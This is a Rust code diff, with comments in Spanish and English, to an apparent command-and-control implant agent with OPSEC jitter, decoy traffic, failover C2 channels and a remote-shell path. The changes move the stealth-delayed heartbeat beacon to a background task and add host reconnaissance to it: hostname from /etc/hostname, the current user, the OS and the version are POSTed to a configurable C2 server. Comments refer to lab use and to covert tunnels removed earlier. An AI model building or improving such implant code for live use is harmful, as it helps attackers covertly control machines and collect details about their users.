@@ -35,7 +35,7 @@ pub struct HiveChamber {
     last_read_seq: AtomicU64,
     pub telemetry: Option<TelemetryCollector>,
     opsec_engine: Mutex<Option<OpsecEngine>>,
-    failover: tokio::sync::Mutex<Option<FailoverDirector>>,
+    failover: Arc<tokio::sync::Mutex<Option<FailoverDirector>>>,
 }
 
 impl HiveChamber {
@@ -90,7 +90,7 @@ impl HiveChamber {
             last_read_seq: AtomicU64::new(start_seq),
             telemetry: Some(collector),
             opsec_engine: Mutex::new(None),
-            failover: tokio::sync::Mutex::new(None),
+            failover: Arc::new(tokio::sync::Mutex::new(None)),
         })
     }
 
@@ -161,37 +161,7 @@ impl HiveChamber {
     /// eliminados junto con las implementaciones de esos túneles — eran
     /// transportes encubiertos sin documentar (véase c2_channels.rs).
     async fn ensure_failover(&self) -> tokio::sync::MutexGuard<'_, Option<FailoverDirector>> {
-        let mut guard = self.failover.lock().await;
-        if guard.is_none() {
-            let mut director = FailoverDirector::new(FailoverPolicy::Priority);
-
-            // HTTP/S channel from HIVE_C2_URL env
-            if std::env::var("HIVE_C2_URL").is_ok() {
-                director.add_channel(C2ChannelConfig {
-                    name: "http_primary".into(),
-                    kind: ChannelKind::Http,
-                    priority: 1,
-                    ..Default::default()
-                });
-            }
-
-            // Always add at least a local HTTP fallback
-            if director.channels.is_empty() {
-                director.add_channel(C2ChannelConfig {
-                    name: "local_log".into(),
-                    kind: ChannelKind::Http,
-                    priority: 99,
-                    ..Default::default()
-                });
-            }
-
-            info!(
-                "FailoverDirector: {} channel(s) configured (http only — covert transports removed in ronda 12)",
-                director.channels.len()
-            );
-            *guard = Some(director);
-        }
-        guard
+        ensure_failover_on(&self.failover).await
     }
 
     /// Update OPSEC calibration from an org profile.
@@ -210,6 +180,16 @@ impl HiveChamber {
     /// Integrated with OpsecEngine for jitter + decoys + schedule compliance.
     /// Integrated with FailoverDirector for multi-channel C2 delivery.
     /// Falls back to legacy raw HTTP if FailoverDirector has no channels.
+    ///
+    /// Ronda 13: the DELIVERY (OPSEC delay + POST + failover channels) runs
+    /// in a spawned background task. It used to be awaited inline, and the
+    /// OPSEC delay (jitter base 30 s, up to 300 s off-peak) blocked the
+    /// agent's main loop for the whole window: `process_incoming` starved
+    /// and the arena heartbeat went stale past `dead_agent_timeout`, so
+    /// live agents flickered out of the topology and the TUI. Arena
+    /// liveness is now decoupled from C2 beacon cadence: the loop returns
+    /// immediately and the beacon goes out (still OPSEC-delayed) in the
+    /// background.
     pub async fn send_heartbeat(&self) {
         let now = crate::utils::timestamp_now();
         arena::update_heartbeat(self.arena.as_ptr(), self.my_slot, now);
@@ -234,16 +214,29 @@ impl HiveChamber {
             }
         };
 
-        // Apply OPSEC jitter delay
-        if opsec_delay_ms > 0 {
-            tokio::time::sleep(std::time::Duration::from_millis(opsec_delay_ms)).await;
-        }
-
-        // Build beacon payload
+        // Build beacon payload. Ronda 13: the beacon used to carry only
+        // type/agent_id/role/timestamp, so the C2 web console had nothing
+        // to show for hostname/user/os/version (every agent rendered as
+        // "unknown"). The enriched fields come from cheap local sources —
+        // no new dependencies.
+        let hostname = std::fs::read_to_string("/etc/hostname")
+            .ok()
+            .map(|s| s.trim().to_string())
+            .filter(|s| !s.is_empty())
+            .or_else(|| std::env::var("HOSTNAME").ok())
+            .unwrap_or_default();
+        let username = std::env::var("USER")
+            .or_else(|_| std::env::var("LOGNAME"))
+            .unwrap_or_default();
+        let os = format!("{} {}", std::env::consts::OS, std::env::consts::ARCH);
         let beacon = format!(
-            r#"{{"type":"heartbeat","agent_id":"{}","role":"{:?}","timestamp":{}}}"#,
+            r#"{{"type":"heartbeat","agent_id":"{}","agent_role":"{:?}","hostname":"{}","username":"{}","os":"{}","version":"{}","timestamp":{}}}"#,
             self.identity.id(),
             self.role(),
+            hostname,
+            username,
+            os,
+            env!("CARGO_PKG_VERSION"),
             now
         );
 
@@ -253,42 +246,54 @@ impl HiveChamber {
         // un proveedor cloud con UA suplantado (producción) — jamás llegaba
         // al C2 mientras el log afirmaba "delivered via failover director".
         // Ahora: POST directo a HIVE_C2_URL y, solo si falla, intento de
-        // canales alternativos del director (DNS/ICMP/dead-drop/lab sink).
-        let sent_direct = match std::env::var("HIVE_C2_URL") {
-            Ok(raw) if !raw.trim().is_empty() => {
-                let beacon_url = format!("{}/beacon", crate::task_poller::normalize_c2_base(&raw));
-                send_c2_beacon(&beacon_url, &beacon).await
+        // canales alternativos del director (lab sink). Todo en background
+        // (ronda 13) para no bloquear el loop del agente.
+        let c2_url: Option<String> = std::env::var("HIVE_C2_URL")
+            .ok()
+            .map(|u| u.trim().to_string())
+            .filter(|u| !u.is_empty());
+        let failover = Arc::clone(&self.failover);
+        tokio::spawn(async move {
+            // Apply OPSEC jitter delay (in the background task now).
+            if opsec_delay_ms > 0 {
+                tokio::time::sleep(std::time::Duration::from_millis(opsec_delay_ms)).await;
             }
-            _ => false,
-        };
-        if sent_direct {
-            info!("C2: heartbeat delivered to HIVE_C2_URL");
-        }
 
-        // Canales alternativos (experiments de transporte del lab).
-        let sent_via_failover = {
-            let mut guard = self.ensure_failover().await;
-            if let Some(ref mut director) = *guard {
-                let results = director.send_with_failover(beacon.as_bytes()).await;
-                let success = results.iter().any(|r| r.success);
-                if success {
-                    info!("SMOKE: heartbeat captured via alternate failover channel");
-                } else if !sent_direct {
-                    warn!("SMOKE: all failover channels failed for heartbeat");
+            let sent_direct = match &c2_url {
+                Some(raw) => {
+                    let beacon_url =
+                        format!("{}/beacon", crate::task_poller::normalize_c2_base(raw));
+                    send_c2_beacon(&beacon_url, &beacon).await
                 }
-                success
-            } else {
-                false
+                None => false,
+            };
+            if sent_direct {
+                info!("C2: heartbeat delivered to HIVE_C2_URL");
             }
-        };
 
-        if !sent_direct && !sent_via_failover {
-            if let Ok(c2_url) = std::env::var("HIVE_C2_URL") {
-                if !c2_url.trim().is_empty() {
+            // Canales alternativos (experiments de transporte del lab).
+            let sent_via_failover = {
+                let mut guard = ensure_failover_on(&failover).await;
+                if let Some(ref mut director) = *guard {
+                    let results = director.send_with_failover(beacon.as_bytes()).await;
+                    let success = results.iter().any(|r| r.success);
+                    if success {
+                        info!("SMOKE: heartbeat captured via alternate failover channel");
+                    } else if !sent_direct {
+                        warn!("SMOKE: all failover channels failed for heartbeat");
+                    }
+                    success
+                } else {
+                    false
+                }
+            };
+
+            if !sent_direct && !sent_via_failover {
+                if let Some(c2_url) = &c2_url {
                     warn!("C2: heartbeat could not be delivered to {}", c2_url);
                 }
             }
-        }
+        });
     }
 
     // ── execute_command (D-6: remote shell via arena) ───────────────────────
@@ -521,6 +526,45 @@ fn role_to_u8(role: &Role) -> u8 {
         Role::Queen => 4,
         Role::Swarm => 5,
     }
+}
+
+/// Lazily initialize the FailoverDirector shared by a chamber (ronda 13:
+/// free function so the background beacon-delivery task can use it without
+/// borrowing the chamber).
+async fn ensure_failover_on(
+    failover: &Arc<tokio::sync::Mutex<Option<FailoverDirector>>>,
+) -> tokio::sync::MutexGuard<'_, Option<FailoverDirector>> {
+    let mut guard = failover.lock().await;
+    if guard.is_none() {
+        let mut director = FailoverDirector::new(FailoverPolicy::Priority);
+
+        // HTTP/S channel from HIVE_C2_URL env
+        if std::env::var("HIVE_C2_URL").is_ok() {
+            director.add_channel(C2ChannelConfig {
+                name: "http_primary".into(),
+                kind: ChannelKind::Http,
+                priority: 1,
+                ..Default::default()
+            });
+        }
+
+        // Always add at least a local HTTP fallback
+        if director.channels.is_empty() {
+            director.add_channel(C2ChannelConfig {
+                name: "local_log".into(),
+                kind: ChannelKind::Http,
+                priority: 99,
+                ..Default::default()
+            });
+        }
+
+        info!(
+            "FailoverDirector: {} channel(s) configured (http only — covert transports removed in ronda 12)",
+            director.channels.len()
+        );
+        *guard = Some(director);
+    }
+    guard
 }
 
 /// Legacy fallback: send a beacon via raw HTTPS POST.
